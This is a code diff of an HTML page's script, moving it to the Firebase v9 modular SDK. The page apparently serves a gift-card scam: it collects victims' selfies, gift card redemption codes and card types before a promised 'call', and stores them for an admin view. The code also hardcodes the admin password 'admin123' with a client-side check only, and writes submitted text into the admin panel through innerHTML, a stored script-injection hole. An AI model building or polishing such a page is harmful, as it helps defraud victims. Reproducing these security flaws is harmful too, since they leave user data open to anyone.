@@ -281,184 +281,155 @@
     <div id="submissionsList"></div>
   </div>
 
-  <script>
+<script type="module">
+  // Import Firebase v9 modular SDK
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+  import { getFirestore, collection, addDoc, getDocs, orderBy, query, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+  import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";
 
-import { initializeApp } from 'firebase/app';
-import { getFirestore, collection, addDoc } from 'firebase/firestore';
-    // Firebase configuration  
-const firebaseConfig = {
-  apiKey: "AIzaSyBUmxEQRSirDF_hc3rvgzwU5vRc5uVifcY",
-  authDomain: "video-call-auth-e2237.firebaseapp.com",
-  projectId: "video-call-auth-e2237",
-  storageBucket: "video-call-auth-e2237.appspot.com",   // <-- FIXED
-  messagingSenderId: "203016834335",
-  appId: "1:203016834335:web:fddc9c06f433a64afcf42a",
-  measurementId: "G-05HNPKVC14"
-};
-    // Initialize Firebase
-    const app = firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
-    const storage = firebase.storage();
+  // Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyBUmxEQRSirDF_hc3rvgzwU5vRc5uVifcY",
+    authDomain: "video-call-auth-e2237.firebaseapp.com",
+    projectId: "video-call-auth-e2237",
+    storageBucket: "video-call-auth-e2237.appspot.com",   // ✅ fixed bucket name
+    messagingSenderId: "203016834335",
+    appId: "1:203016834335:web:fddc9c06f433a64afcf42a",
+    measurementId: "G-05HNPKVC14"
+  };
 
-    const ADMIN_PASSWORD = "admin123"; // Change password here
-    let submissions = [];
-    function submitFiles() {
-      const selfie = document.getElementById("selfie").files[0];
-      const redemptionCode = document.getElementById("redemptionCode").value.trim();
-      const selectedCards = Array.from(document.querySelectorAll('input[name="cardType"]:checked'))                                .map(cb => cb.value);
-      
-      if (!selfie) {
-        showStatus("Please upload a selfie before submitting.", "error");
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+  const storage = getStorage(app);
+
+  const ADMIN_PASSWORD = "admin123"; // Change password here
+
+  async function submitFiles() {
+    const selfie = document.getElementById("selfie").files[0];
+    const redemptionCode = document.getElementById("redemptionCode").value.trim();
+    const selectedCards = Array.from(document.querySelectorAll('input[name="cardType"]:checked')).map(cb => cb.value);
+
+    if (!selfie) return showStatus("Please upload a selfie before submitting.", "error");
+    if (!redemptionCode) return showStatus("Please enter your redemption code.", "error");
+    if (selectedCards.length === 0) return showStatus("Please select at least one redemption method.", "error");
+
+    document.getElementById("loading").style.display = "block";
+    document.getElementById("submitBtn").disabled = true;
+
+    try {
+      // Upload selfie
+      const selfieRef = ref(storage, `selfies/${Date.now()}_${selfie.name}`);
+      await uploadBytes(selfieRef, selfie);
+      const downloadURL = await getDownloadURL(selfieRef);
+
+      // Save Firestore document
+      const submission = {
+        selfieURL: downloadURL,
+        redemptionCode,
+        cardTypes: selectedCards,
+        time: new Date().toLocaleString(),
+        timestamp: serverTimestamp()
+      };
+      const docRef = await addDoc(collection(db, "submissions"), submission);
+
+      showStatus("Submission successful! You can now join the call.", "success");
+      console.log("Document written with ID: ", docRef.id);
+
+    } catch (error) {
+      console.error("Error details:", error);
+
+      // Save Firestore fallback
+      try {
+        const submission = {
+          redemptionCode,
+          cardTypes: selectedCards,
+          time: new Date().toLocaleString(),
+          timestamp: serverTimestamp(),
+          error: "Image upload failed, but data was saved"
+        };
+        await addDoc(collection(db, "submissions"), submission);
+        showStatus("Data saved (image upload failed). You can now join the call.", "success");
+      } catch (dbError) {
+        showStatus(`Error: ${dbError.message}`, "error");
+        console.error("Error adding document: ", dbError);
+      }
+    } finally {
+      document.getElementById("loading").style.display = "none";
+      document.getElementById("submitBtn").disabled = false;
+    }
+  }
+
+  function showStatus(message, type) {
+    const statusEl = document.getElementById("statusMessage");
+    statusEl.textContent = message;
+    statusEl.className = `status-message ${type}`;
+    statusEl.style.display = "block";
+    setTimeout(() => { statusEl.style.display = "none"; }, 5000);
+  }
+
+  function requestAdminAccess() {
+    const pass = prompt("Enter admin password:");
+    if (pass === ADMIN_PASSWORD) {
+      openAdmin();
+    } else {
+      alert("Access Denied!");
+    }
+  }
+
+  async function openAdmin() {
+    const panel = document.getElementById("adminPanel");
+    const list = document.getElementById("submissionsList");
+    list.innerHTML = "";
+
+    try {
+      const q = query(collection(db, "submissions"), orderBy("timestamp", "desc"));
+      const snapshot = await getDocs(q);
+
+      if (snapshot.empty) {
+        list.innerHTML = "<p>No submissions found.</p>";
         return;
       }
-      
-      if (!redemptionCode) {
-        showStatus("Please enter your redemption code.", "error");
-        return;
-      }
-      
-      if (selectedCards.length === 0) {
-        showStatus("Please select at least one redemption method.", "error");
-        return;
-      }
-      
-      // Show loading state
-      document.getElementById("loading").style.display = "block";
-      document.getElementById("submitBtn").disabled = true;
-      
-      // Upload selfie to Firebase Storage
-      const storageRef = storage.ref();
-      const selfieRef = storageRef.child(`selfies/${Date.now()}_${selfie.name}`);
-      
-      selfieRef.put(selfie)
-        .then((snapshot) => {
-          return snapshot.ref.getDownloadURL();
-        })
-        .then((downloadURL) => {
-          // Save to Firestore
-          const submission = {
-            selfieURL: downloadURL,
-            redemptionCode: redemptionCode,
-            cardTypes: selectedCards,
-            time: new Date().toLocaleString(),
-            timestamp: firebase.firestore.FieldValue.serverTimestamp()
-          };
-          
-          return db.collection("submissions").add(submission);
-        })
-        .then((docRef) => {
-          showStatus("Submission successful! You can now join the call.", "success");
-          console.log("Document written with ID: ", docRef.id);
-          
-          // Add to local array for admin panel
-          const selfieFile = document.getElementById("selfie").files[0];
-          const reader = new FileReader();
-          reader.onload = function(e) {
-            submissions.push({
-              selfie: e.target.result,
-              redemptionCode: redemptionCode,
-              cardTypes: selectedCards,
-              time: new Date().toLocaleString()
-            });
-          };
-          reader.readAsDataURL(selfieFile);
-        })
-        .catch((error) => {
-          console.error("Error details:", error);
-          
-          // Fallback: Save to Firestore without the image URL if Storage fails
-          const submission = {
-            redemptionCode: redemptionCode,   cardTypes: selectedCards,
-            time: new Date().toLocaleString(),
-            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-            error: "Image upload failed, but data was saved"
-          };
-          
-          return db.collection("submissions").add(submission)
-            .then((docRef) => {
-              showStatus("Data saved (image upload failed). You can now join the call.", "success");
-              console.log("Document written with ID: ", docRef.id);
-            })
-            .catch((dbError) => {
-              showStatus(`Error: ${dbError.message}`, "error");
-              console.error("Error adding document: ", dbError);
-            });
-        })
-        .finally(() => {
-          document.getElementById("loading").style.display = "none";
-          document.getElementById("submitBtn").disabled = false;
-        });
-    }
 
-    function showStatus(message, type) {
-      const statusEl = document.getElementById("statusMessage");
-      statusEl.textContent = message;
-      statusEl.className = `status-message ${type}`;
-      statusEl.style.display = "block";
-      
-      // Auto-hide after 5 seconds
-      setTimeout(() => {
-        statusEl.style.display = "none";
-      }, 5000);
-    }
-
-    function requestAdminAccess() {
-      const pass = prompt("Enter admin password:");
-      if (pass === ADMIN_PASSWORD) {
-        openAdmin();
-      } else {
-        alert("Access Denied!");
-      }
-    }
-
-    function openAdmin() {
-      const panel = document.getElementById("adminPanel");
-      const list = document.getElementById("submissionsList");
-      list.innerHTML = "";
-
-      // Load from Firestore
-      db.collection("submissions").orderBy("timestamp", "desc").get()
-        .then((querySnapshot) => {
-          if (querySnapshot.empty) {
-            list.innerHTML = "<p>No submissions found.</p>";
-            return;
-          }
-          
-          querySnapshot.forEach((doc) => {
-            const data = doc.data();
-            list.innerHTML += `
-              <div class="submission">
-                <p><b>Submission ID:</b> ${doc.id}</p>
-                <p><b>Time:</b> ${data.time}</p>
-                <p><b>Redemption Code:</b> ${data.redemptionCode || 'N/A'}</p>
-                <p><b>Card Types:</b> ${data.cardTypes ? data.cardTypes.join(", ") : 'N/A'}</p>
-                ${data.selfieURL ? `<img src="${data.selfieURL}" alt="Selfie">` : '<p>No image available</p>'}
-                ${data.error ? `<p class="error">Error: ${data.error}</p>` : ''}
-              </div>
-            `;
-          });
-        })
-        .catch((error) => {
-          list.innerHTML = `<p>Error loading data: ${error.message}</p>`;
-        });
-
-      panel.style.display = "block";
-    }
-
-    function closeAdmin() {
-      document.getElementById("adminPanel").style.display = "none";
-    }
-
-    // Prevent selecting multiple card types
-    document.querySelectorAll('input[name="cardType"]').forEach(checkbox => {
-      checkbox.addEventListener('change', function() {
-        if (this.checked) {
-          document.querySelectorAll('input[name="cardType"]').forEach(other => {
-            if (other !== this) other.checked = false;
-          });
-        }
+      snapshot.forEach((doc) => {
+        const data = doc.data();
+        list.innerHTML += `
+          <div class="submission">
+            <p><b>Submission ID:</b> ${doc.id}</p>
+            <p><b>Time:</b> ${data.time}</p>
+            <p><b>Redemption Code:</b> ${data.redemptionCode || 'N/A'}</p>
+            <p><b>Card Types:</b> ${data.cardTypes ? data.cardTypes.join(", ") : 'N/A'}</p>
+            ${data.selfieURL ? `<img src="${data.selfieURL}" alt="Selfie">` : '<p>No image available</p>'}
+            ${data.error ? `<p class="error">Error: ${data.error}</p>` : ''}
+          </div>
+        `;
       });
+    } catch (error) {
+      list.innerHTML = `<p>Error loading data: ${error.message}</p>`;
+    }
+
+    panel.style.display = "block";
+  }
+
+  function closeAdmin() {
+    document.getElementById("adminPanel").style.display = "none";
+  }
+
+  // Allow only one card type at a time
+  document.querySelectorAll('input[name="cardType"]').forEach(checkbox => {
+    checkbox.addEventListener('change', function () {
+      if (this.checked) {
+        document.querySelectorAll('input[name="cardType"]').forEach(other => {
+          if (other !== this) other.checked = false;
+        });
+      }
     });
-  </script>
+  });
+
+  // Expose functions globally
+  window.submitFiles = submitFiles;
+  window.requestAdminAccess = requestAdminAccess;
+  window.closeAdmin = closeAdmin;
+</script>
 </body>
 </html>
